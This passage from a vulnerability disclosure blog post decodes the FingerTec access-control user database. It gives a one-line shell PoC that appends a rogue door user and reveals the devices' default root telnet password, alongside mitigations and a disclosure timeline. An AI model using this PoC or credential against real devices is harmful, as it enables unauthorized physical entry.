02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00
</code></pre>

<p>Now, the admin was enrolled with id 1, and pin 1234.  The user was enrolled with id 2000, pin 6969.  Bytes 4-7 look to be ASCII, and actually correspond with the pin number.  Byte 1 seems to be an index number.  Byte 3 is most likely privilege level (6 for admin, 0 for user).  Bytes 25 looks to be the id for 1, and 0x07d0 is 2000, so the numbers are stored little endian.  Based off one of the production units, I was also able to see that 9-16 is an ascii Name, and 17-19 is the RFID card number (little endian).</p>

<h2 id="poc">PoC</h2>

<p>Ok, so now I know how the user database works.  How can I actually use this to get in a door?</p>

<pre><code>echo -n -e \\\\x39\\\\x5\\\\x6\\\\x31\\\\x32\\\\x33\\\\x34\\\\x35\\\\x48\\\\x61\\\\x78\\\\x78\\\\x30\\\\x72\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x1\\\\x0\\\\x0\\\\x39\\\\x5\\\\x0\\\\x0 &gt;&gt; user.dat
</code></pre>

<p>That simple one liner will append a record onto the user.dat file.  It will look like:</p>

<pre><code> 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
-----------------------------------------------------------------------------------
39 05 06 31 32 33 34 35 48 61 78 78 30 72 00 00 00 00 00 00 00 01 00 00 39 05 00 00
</code></pre>

<p>This will create a user named Haxx0r, with id 1337, with a pin number of 12345.  Then you can just walk up to the door and let yourself in.</p>

<h2 id="mitigation">Mitigation</h2>

<p>Unfortunately, this isn’t going to be patched anytime in the near future.  Obviously, the most effective mitigation is to take these devices completely off the network.  You then lose all of the advantages from having a centrally managed system, though.  In lieu of that, here is what you can do:</p>

<h3 id="segregate-the-hell-out-of-these-things">Segregate the hell out of these things</h3>

<p>Put them on their own vlan, with no access to the internet, and no access to/from any other vlans, with the exception of the management server.  There really is no good reason these things should be anywhere near the public internet (although a lot of them unfortunately are).</p>

<h3 id="change-the-root-telnet-password">Change the root telnet password</h3>

<p>Luckily, it is pretty easy to change the root password.  You just set a new root password, then copy the passwd file (no shadow files here) over /mnt/mtdblock and /mnt/mtdblock/data</p>

<pre><code># passwd
Changing password for root
Enter the new password (minimum of 5, maximum of 8 characters)
Please use a combination of upper and lower case letters and numbers.
Enter new password: 
Re-enter new password: 
Password changed.
# cp /etc/passwd /mnt/mtdblock
# cp /etc/passwd /mnt/mtdblock/data/
</code></pre>

<p>You will need to change the password back to founder88 in order to do any firmware updates.</p>

<h2 id="disclosure-timeline">Disclosure Timeline</h2>

<ul>
  <li>10/1/15 - Contacted FingerTec laying out issues and recommendations</li>
  <li>10/1/15 - Received response (in 5 hours!) thanking me, and saying that they’d go over it with R&amp;D</li>
  <li>12/15/15 - Sent a follow up email, letting them know I’m looking at publishing the results on 1/1/2016</li>
  <li>12/15/15 - Received response that due to complexity of firmwares, they won’t be able to address the security concerns for awhile</li>
  <li>1/7/16 - Disclosure</li>
</ul>

<p>I mulled over quite a bit whether or not to drop the root password.  I decided to drop it because<br />
A. Anyone with any level of skill could find it<br />
B. There are at least 100 machines open on the internet vulnerable.  That doesn’t include devices behind weak wifi, etc.<br />
C. You need the root password in order to secure the device.</p>

<p>An access control system should never make it easier for a bad guy to get in.  I’m currently working on reversing the protocol that these readers natively speak, and will write up that whole process once I finish.</p>


              </div>
              
              <div id="disqus_thread">
                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
              </div>
              
            </div>
          </div>
        </div>
        <div class="col-md-4 hidden-xs">
          <div class="sidebar ">
  <h2>Recent Posts</h2>
  <ul>
    
    <li><a href="/2016/01/booby-trapped-samba-shares">Booby Trapping Samba Shares</a></li>
    
    <li><a href="/2016/01/fingertec-rce">FingerTec Biometric Access Control Devices - Remote Code Exec and Remote Enrollment</a></li>
    
    <li><a href="/2014/12/opwnerp-research">OpwnERP: Going from Unauthenticated Remote Access to RCE with Odoo ( Formerly OpenERP )</a></li>
    
  </ul>
</div>

<div class="sidebar">
  <h2>Tags</h2>
  <ul>
    
      <li><a href="/tag/openerp">openerp</a></li>
    
      <li><a href="/tag/odoo">odoo</a></li>
    
      <li><a href="/tag/web">web</a></li>
    
      <li><a href="/tag/postgresql">postgresql</a></li>
    
      <li><a href="/tag/rce">rce</a></li>
    
      <li><a href="/tag/security">security</a></li>
    
      <li><a href="/tag/pentest">pentest</a></li>
    
      <li><a href="/tag/fingertec">fingertec</a></li>
    
      <li><a href="/tag/telnet">telnet</a></li>
    
      <li><a href="/tag/wireshark">wireshark</a></li>
    
      <li><a href="/tag/samba">samba</a></li>
    
      <li><a href="/tag/linux">linux</a></li>
    
      <li><a href="/tag/blue_team">blue_team</a></li>
    
  </ul>
</div>

        </div>
      </div>
    </div>
    
<!-- Add Disqus comments. -->
<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'digital-panther'; // required: replace example with your forum shortname
  var disqus_identifier = "/2016/01/fingertec-rce";

  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


  </div>
      <footer class="footer-distributed">
      <div class="container">
        <div class="footer">
          <p>Digital Panther Security &copy; 2016</p>
          <h6>Follow me</h6>

<ul class="social-media">

  
    <li>
      <a title="fang0654 on Github" href="https://github.com/fang0654" target="_blank"><i class="fa fa-github fa-2x"></i></a>
    </li>
  

  
    <li>
      <a title="1239023 on StackOverflow" href="http://stackoverflow.com/users/1239023" target="_blank"><i class="fa fa-stack-overflow fa-2x"></i></a>
    </li>
  

  
    <li>
      <a title="fang0654 on LinkedIn" href="https://www.linkedin.com/in/daniel-lawson-84685314" target="_blank"><i class="fa fa-linkedin fa-2x"></i></a>
    </li>
  


  
    <li>
      <a title="feed.xml RSS" href="https://digital-panther.com/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
    </li>
  

</ul>

        </div>
      </div>
    </footer>
  </body>
</html>

</div>
